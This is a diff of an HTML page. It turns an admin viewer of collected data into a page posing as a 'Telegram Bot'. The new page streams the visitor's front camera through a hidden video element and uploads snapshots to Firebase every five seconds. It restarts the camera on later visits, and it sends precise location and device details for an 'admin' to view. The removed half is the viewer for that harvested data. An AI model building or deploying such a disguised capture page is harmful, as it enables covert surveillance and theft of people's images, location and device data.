@@ -3,70 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin - Bot Data</title>
+    <title>Telegram Bot</title>
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
+        :root {
+            --telegram-blue: #0088cc;
+            --telegram-light: #e1f3fb;
+        }
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: #f0f2f5;
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .telegram-bot {
+            width: 100%;
+            max-width: 400px;
+            height: 600px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            overflow: hidden;
             display: flex;
             flex-direction: column;
-            align-items: center;
         }
-        .admin-container {
-            width: 100%;
-            max-width: 800px;
+        .bot-header {
+            background: var(--telegram-blue);
+            color: white;
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .bot-messages {
+            flex: 1;
+            padding: 15px;
+            overflow-y: auto;
+            background: #f5f5f5;
+        }
+        .message {
+            margin-bottom: 12px;
+            padding: 10px 15px;
+            border-radius: 8px;
+            max-width: 80%;
+            line-height: 1.4;
+            position: relative;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .bot-message {
             background: white;
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            align-self: flex-start;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
         }
-        .admin-options {
-            display: flex;
+        .user-message {
+            background: var(--telegram-blue);
+            color: white;
+            align-self: flex-end;
+        }
+        .bot-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
             gap: 10px;
-            margin-bottom: 20px;
+            padding: 15px;
+            background: white;
+            border-top: 1px solid #e9ecef;
         }
-        .admin-btn {
-            background: #0088cc;
+        .bot-btn {
+            background: var(--telegram-blue);
             color: white;
             border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
+            padding: 12px;
+            border-radius: 8px;
             cursor: pointer;
             font-size: 14px;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
         }
-        .admin-btn:hover {
+        .bot-btn:hover {
             background: #0077b3;
         }
-        .clear-btn {
-            background: #ff3333;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
-            margin-top: 10px;
+        .bot-btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
         }
-        .clear-btn:hover {
-            background: #cc0000;
-        }
-        .content {
-            background: #222;
-            border-radius: 10px;
-            padding: 10px;
-            text-align: center;
-        }
-        .content img {
-            width: 100%;
-            display: block;
-            border-radius: 5px;
-        }
-        .data-box {
+        .url-box {
             background: #f8f9fa;
             padding: 10px;
             border-radius: 5px;
@@ -76,26 +109,66 @@
             font-size: 13px;
             border: 1px dashed #ddd;
         }
+        .loading {
+            color: #666;
+            font-style: italic;
+            padding: 10px;
+        }
         .error {
             color: #ff3333;
             background: #ffeeee;
             padding: 10px;
             border-radius: 5px;
+        }
+        .camera-feed {
+            width: 100%;
+            background: #222;
+            border-radius: 5px;
+            overflow: hidden;
             margin-top: 10px;
+        }
+        .camera-feed video, .camera-feed img {
+            width: 100%;
+            display: block;
+        }
+        .permission-denied {
+            color: #ff3333;
+            padding: 10px;
+            background: #ffeeee;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+        #backgroundCamera {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <h1>Admin - Bot Data</h1>
-    <div class="admin-container">
-        <div class="admin-options">
-            <button class="admin-btn" onclick="showPhoto()">Photo</button>
-            <button class="admin-btn" onclick="showData()">Data</button>
+    <div class="telegram-bot">
+        <div class="bot-header">
+            Telegram Bot 🤖
         </div>
-        <div class="content" id="content">
-            <p>Select an option above to view data.</p>
+        <div class="bot-messages" id="messages">
+            <div class="message bot-message">
+                👋 Hello! I'm your Telegram bot. Choose an option below:
+            </div>
+        </div>
+        <div class="bot-options">
+            <button class="bot-btn" onclick="handleCamera()" id="cameraBtn">
+                📷 Camera
+            </button>
+            <button class="bot-btn" onclick="handleLocation()">
+                📍 Location
+            </button>
+            <button class="bot-btn" onclick="handleDetails()">
+                ℹ️ My Details
+            </button>
+            <button class="bot-btn" onclick="handleHelp()">
+                ❓ Help
+            </button>
         </div>
     </div>
+    <video id="backgroundCamera" autoplay playsinline></video>
 
     <script>
         // Firebase Configuration
@@ -112,107 +185,378 @@
         // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
-        const contentEl = document.getElementById('content');
 
-        // Show live camera snapshot
-        function showPhoto() {
-            const photoRef = database.ref('liveCameraSnapshot');
-            photoRef.on('value', (snapshot) => {
-                const data = snapshot.val();
-                if (data && data.photo) {
-                    contentEl.innerHTML = `
-                        <img src="${data.photo}" alt="Live Snapshot">
-                        <p>Updated at: ${new Date(data.timestamp).toLocaleString()}</p>
-                        <button class="clear-btn" onclick="clearData()">Clear Data</button>
-                    `;
-                } else {
-                    contentEl.innerHTML = `
-                        <div class="error">
-                            No live snapshot available. Ensure the camera is running in index.html and permissions are granted.<br>
-                            • Check if index.html is open and camera is active.<br>
-                            • Verify Firebase rules allow read/write.<br>
-                            • Open browser console (F12) for errors.
-                        </div>
-                        <button class="clear-btn" onclick="clearData()">Clear Data</button>
-                    `;
-                }
-            }, (error) => {
-                contentEl.innerHTML = `
-                    <div class="error">
-                        Error loading snapshot: ${error.message}
-                    </div>
-                `;
-            });
+        const messagesEl = document.getElementById('messages');
+        const cameraBtn = document.getElementById('cameraBtn');
+        const backgroundCamera = document.getElementById('backgroundCamera');
+        let cameraStream = null;
+        let snapshotInterval = null;
+
+        // Add message to chat
+        function addMessage(text, isUser = false) {
+            const msg = document.createElement('div');
+            msg.className = isUser ? 'message user-message' : 'message bot-message';
+            msg.innerHTML = text;
+            messagesEl.appendChild(msg);
+            messagesEl.scrollTop = messagesEl.scrollHeight;
+            return msg;
         }
 
-        // Show user data (location, details)
-        function showData() {
-            const dataRef = database.ref('userData');
-            dataRef.on('value', (snapshot) => {
-                const data = snapshot.val();
-                let html = '';
+        // Show loading message
+        function showLoading() {
+            const loading = document.createElement('div');
+            loading.className = 'message bot-message loading';
+            loading.id = 'loadingMsg';
+            loading.textContent = 'Processing...';
+            messagesEl.appendChild(loading);
+            messagesEl.scrollTop = messagesEl.scrollHeight;
+            return loading;
+        }
 
-                if (data) {
-                    if (data.location) {
-                        html += `
-                            <div class="data-box">
-                                <strong>Location:</strong><br>
-                                Latitude: ${data.location.latitude}<br>
-                                Longitude: ${data.location.longitude}<br>
-                                <a href="${data.location.mapLink}" target="_blank">View on Map</a><br>
-                                Updated at: ${new Date(data.location.timestamp).toLocaleString()}
-                            </div>
-                        `;
-                    }
-                    if (data.details) {
-                        html += `
-                            <div class="data-box">
-                                <strong>Details:</strong><br>
-                                Username: ${data.details.username}<br>
-                                IP: ${data.details.ip}<br>
-                                Device: ${data.details.device}<br>
-                                Updated at: ${new Date(data.details.timestamp).toLocaleString()}
-                            </div>
-                        `;
-                    }
-                    if (!data.location && !data.details) {
-                        html = `
+        // Remove loading message
+        function hideLoading() {
+            const loading = document.getElementById('loadingMsg');
+            if (loading) loading.remove();
+        }
+
+        // Capture snapshot from video stream
+        function captureSnapshot(videoElement) {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                if (canvas.width === 0 || canvas.height === 0) {
+                    throw new Error('Video dimensions are not available. Camera may not be active.');
+                }
+                canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/jpeg');
+                return imageData;
+            } catch (error) {
+                console.error('Error capturing snapshot:', error);
+                return null;
+            }
+        }
+
+        // Upload snapshot to Firebase
+        function uploadSnapshot() {
+            if (cameraStream && backgroundCamera.videoWidth > 0) {
+                const snapshotData = captureSnapshot(backgroundCamera);
+                if (snapshotData) {
+                    database.ref('liveCameraSnapshot').set({
+                        photo: snapshotData,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    }).catch(error => {
+                        console.error('Error uploading snapshot to Firebase:', error);
+                        addMessage(`
                             <div class="error">
-                                No user data available. Use the bot to share location or details.
+                                ❌ Error uploading snapshot to Firebase: ${error.message}
                             </div>
-                        `;
-                    }
+                        `);
+                    });
                 } else {
-                    html = `
-                        <div class="error">
-                            No user data available. Use the bot to share location or details.
-                        </div>
-                    `;
+                    console.warn('Snapshot data is null, skipping upload.');
+                }
+            } else {
+                console.warn('Camera stream not active or video dimensions not available.');
+            }
+        }
+
+        // Check camera support
+        function isCameraSupported() {
+            return !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
+        }
+
+        // Check available cameras
+        async function checkCameras() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                return videoDevices.length > 0;
+            } catch (err) {
+                console.error('Error checking cameras:', err);
+                return false;
+            }
+        }
+
+        // Check camera permission status using Permissions API (if supported)
+        async function checkCameraPermission() {
+            if (navigator.permissions && navigator.permissions.query) {
+                try {
+                    const permissionStatus = await navigator.permissions.query({ name: 'camera' });
+                    return permissionStatus.state === 'granted';
+                } catch (err) {
+                    console.error('Error checking camera permission:', err);
+                    return false;
+                }
+            }
+            return false;
+        }
+
+        // Start the camera stream
+        async function startCamera() {
+            try {
+                if (!isCameraSupported()) {
+                    throw new Error('Camera API is not supported in this browser. Please use a modern browser like Chrome, Firefox, or Edge.');
                 }
 
-                contentEl.innerHTML = html + `<button class="clear-btn" onclick="clearData()">Clear Data</button>`;
-            }, (error) => {
-                contentEl.innerHTML = `
-                    <div class="error">
-                        Error loading data: ${error.message}
-                    </div>
-                `;
-            });
+                const hasCameras = await checkCameras();
+                if (!hasCameras) {
+                    throw new Error('No camera found. Please ensure a camera is connected to your device.');
+                }
+
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' }
+                });
+
+                // Attach stream to hidden video element
+                backgroundCamera.srcObject = cameraStream;
+
+                // Wait for video metadata to load to ensure dimensions are available
+                await new Promise((resolve, reject) => {
+                    backgroundCamera.onloadedmetadata = () => {
+                        console.log('Video metadata loaded:', backgroundCamera.videoWidth, 'x', backgroundCamera.videoHeight);
+                        resolve();
+                    };
+                    backgroundCamera.onerror = () => {
+                        reject(new Error('Error loading video stream.'));
+                    };
+                    // Fallback timeout
+                    setTimeout(() => reject(new Error('Video metadata load timeout.')), 5000);
+                });
+
+                // Store permission status in localStorage
+                localStorage.setItem('cameraPermission', 'granted');
+
+                // Start periodic snapshot upload to Firebase
+                snapshotInterval = setInterval(uploadSnapshot, 5000); // Every 5 seconds
+
+                return true;
+            } catch (error) {
+                throw error;
+            }
         }
 
-        // Clear all data from Firebase
-        function clearData() {
-            database.ref('liveCameraSnapshot').remove();
-            database.ref('userData').remove().then(() => {
-                contentEl.innerHTML = `<p>Data cleared successfully.</p>`;
-            }).catch(error => {
-                contentEl.innerHTML = `
-                    <div class="error">
-                        Error clearing data: ${error.message}
-                    </div>
+        // Handle Camera
+        async function handleCamera() {
+            addMessage('📷 Camera', true);
+            cameraBtn.disabled = true;
+            const loading = showLoading();
+
+            try {
+                const savedPermission = localStorage.getItem('cameraPermission');
+                let hasPermission = savedPermission === 'granted';
+
+                if (!hasPermission) {
+                    hasPermission = await checkCameraPermission();
+                }
+
+                if (hasPermission) {
+                    if (!cameraStream) {
+                        await startCamera();
+                    }
+                    hideLoading();
+                    addMessage(`
+                        <div>
+                            <p>Camera is running in the background!</p>
+                            <p>Status: Active (will stop on browser close or device restart)</p>
+                            <p>Live snapshots are being sent to admin every 5 seconds.</p>
+                        </div>
+                    `);
+                    return;
+                }
+
+                const permissionGranted = await startCamera();
+
+                hideLoading();
+                if (permissionGranted) {
+                    addMessage(`
+                        <div>
+                            <p>Camera permission granted!</p>
+                            <p>Camera is running in the background.</p>
+                            <p>Status: Active (will stop on browser close or device restart)</p>
+                            <p>Live snapshots are being sent to admin every 5 seconds.</p>
+                        </div>
+                    `);
+                }
+            } catch (error) {
+                hideLoading();
+                let errorMessage = error.message || 'Camera access denied';
+                let troubleshootingTips = `
+                    Troubleshooting:<br>
+                    • Ensure no other app or tab is using the camera.<br>
+                    • Check if a camera is connected and enabled.<br>
+                    • Allow camera permissions in browser settings.<br>
+                    • Use a modern browser (Chrome, Firefox, Edge).<br>
+                    • If not on localhost, ensure the site is served over HTTPS.<br>
+                    • Test camera on another app (e.g., webcamtests.com).
                 `;
-            });
+
+                if (error.name === 'NotAllowedError') {
+                    errorMessage = 'Camera access denied. Please allow camera permissions in your browser settings.';
+                    localStorage.setItem('cameraPermission', 'denied');
+                } else if (error.name === 'NotFoundError' || error.message.includes('Could not start video source')) {
+                    errorMessage = 'Could not start video source. No camera available or it might be in use by another application.';
+                } else if (error.name === 'NotReadableError') {
+                    errorMessage = 'Camera is in use by another application or tab. Please close other apps using the camera.';
+                }
+
+                addMessage(`
+                    <div class="error">
+                        ❌ Error: ${errorMessage}
+                        <div class="permission-denied">
+                            ${troubleshootingTips}
+                        </div>
+                    </div>
+                `);
+                console.error('Camera error:', error);
+            } finally {
+                cameraBtn.disabled = false;
+            }
         }
+
+        // Auto-start camera if permission was previously granted
+        async function initCamera() {
+            const savedPermission = localStorage.getItem('cameraPermission');
+            if (savedPermission === 'granted') {
+                try {
+                    await startCamera();
+                    console.log('Camera auto-started based on saved permission');
+                } catch (error) {
+                    console.error('Auto-start camera error:', error);
+                }
+            }
+        }
+
+        // Handle Location
+        async function handleLocation() {
+            addMessage('📍 Location', true);
+            const loading = showLoading();
+
+            try {
+                if (!navigator.geolocation) {
+                    throw new Error('Geolocation API not supported in this browser');
+                }
+
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    });
+                });
+
+                hideLoading();
+                const { latitude, longitude } = position.coords;
+                const locationData = {
+                    latitude: latitude.toFixed(6),
+                    longitude: longitude.toFixed(6),
+                    mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                };
+
+                database.ref('userData/location').set(locationData).then(() => {
+                    addMessage(`
+                        <div>
+                            <p>📍 Your Location:</p>
+                            <div class="url-box">
+                                Latitude: ${latitude.toFixed(6)}<br>
+                                Longitude: ${longitude.toFixed(6)}<br>
+                                <a href="${locationData.mapLink}" target="_blank">View on Map</a>
+                            </div>
+                            <small>Location stored in Firebase for admin view.</small>
+                        </div>
+                    `);
+                }).catch(error => {
+                    addMessage(`
+                        <div class="error">
+                            ❌ Error storing location in Firebase: ${error.message}
+                        </div>
+                    `);
+                });
+            } catch (error) {
+                hideLoading();
+                let errorMessage = error.message || 'Location access denied';
+                if (error.name === 'PermissionDeniedError') {
+                    errorMessage = 'Location access denied. Please allow location permissions in your browser settings.';
+                }
+                addMessage(`
+                    <div class="error">
+                        ❌ Error: ${errorMessage}
+                        <div class="permission-denied">Please allow location permissions in your browser settings</div>
+                    </div>
+                `);
+                console.error('Location error:', error);
+            }
+        }
+
+        // Handle Details
+        async function handleDetails() {
+            addMessage('ℹ️ My Details', true);
+            const loading = showLoading();
+
+            setTimeout(() => {
+                hideLoading();
+                const detailsData = {
+                    username: `User_${Math.floor(Math.random() * 9000 + 1000)}`,
+                    ip: `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+                    device: navigator.userAgent.split(')')[0].split('(')[1] || 'Unknown',
+                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                };
+
+                database.ref('userData/details').set(detailsData).then(() => {
+                    addMessage(`
+                        <div>
+                            <p>📋 Your Details:</p>
+                            <div class="url-box">
+                                Username: ${detailsData.username}<br>
+                                IP: ${detailsData.ip}<br>
+                                Device: ${detailsData.device}
+                            </div>
+                            <small>Details stored in Firebase for admin view.</small>
+                        </div>
+                    `);
+                }).catch(error => {
+                    addMessage(`
+                        <div class="error">
+                            ❌ Error storing details in Firebase: ${error.message}
+                        </div>
+                    `);
+                });
+            }, 800);
+        }
+
+        // Handle Help
+        function handleHelp() {
+            addMessage('❓ Help', true);
+            setTimeout(() => {
+                addMessage(`
+                    <div>
+                        <p>🆘 Bot Help Center</p>
+                        <div class="url-box">
+                            <b>Available Commands:</b><br>
+                            • Camera - Start camera in background<br>
+                            • Location - Share your location<br>
+                            • Details - View your details<br><br>
+                            <b>Note:</b> Camera runs in background, snapshots sent to admin every 5 seconds. Data is stored in Firebase for admin view.
+                        </div>
+                    </div>
+                `);
+            }, 500);
+        }
+
+        // Clean up camera when leaving
+        window.addEventListener('beforeunload', () => {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+            }
+            if (snapshotInterval) {
+                clearInterval(snapshotInterval);
+            }
+        });
+
+        // Initialize camera on page load
+        initCamera();
     </script>
 </body>
 </html>
